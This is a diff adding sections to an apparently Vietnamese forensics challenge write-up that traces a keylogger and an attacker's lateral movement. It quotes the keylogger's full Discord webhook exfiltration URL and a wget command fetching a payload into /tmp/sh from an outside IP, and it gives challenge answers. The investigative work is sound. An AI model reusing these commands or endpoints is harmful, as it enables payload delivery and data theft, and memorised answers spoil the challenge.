@@ -38,4 +38,33 @@ script này thực hiện vòng lặp cứ mỗi 1s sẽ kiểm tra có process 
 
 Ở đây ta thấy SSH.exe được truy cập lần cuối lúc 2025-12-26 01:09:08 ( mình đã thử khoảng thời gian này và 2025-12-26 01:09:09 nhưng vẫn không được)
 
+### 5. Identify the time interval (in milliseconds) that the keylogger waits before sending captured data to the server.
+Reverse temp.exe 
+![alt text](image-9.png)
 
+=> Answer : 1200000
+
+### 6. The keylogger exfiltrated captured data to a remote server. Provide the full destination URL.
+Từ đoạn trên t thấy nó gọi hàm Sub_1400023D0 để gửi về C2
+![alt text](image-10.png)
+
+![alt text](image-11.png)
+
+=> Answer : https://discord.com/api/webhooks/1452445434894221455/pKIO5TZGrGL7KaWLb_H03S61nI9OcRe_UKvEHhOBgG507IyprUxzYzBSOyTj46c2AVCY
+
+### 7.
+Dựa vào câu 3 ta biết được máy đích mà Attacker lateral movement có IP 10.101.1.12, sau khi kiểm tra eventID 4624 (LogonType 3) từ máy $D01 ta phát hiện máy có IP trên là $APP01 cũng như máy $WKS01 có IP 10.101.2.7
+
+![alt text](image-5.png)
+![alt text](image-6.png)
+
+Kiểm tra log wtmp trên $APP01
+
+![alt text](image-7.png)
+
+### 8. After moving laterally to the second system, the threat actor downloaded two malicious executables. When was the second executable file downloaded?
+Kiểm tra .bash_history ta thấy người dùng tải file thứ 2 (wget http://93.121.68.219:8908/b21 -O /tmp/sh)
+
+![alt text](image-8.png)
+
+### 9. 
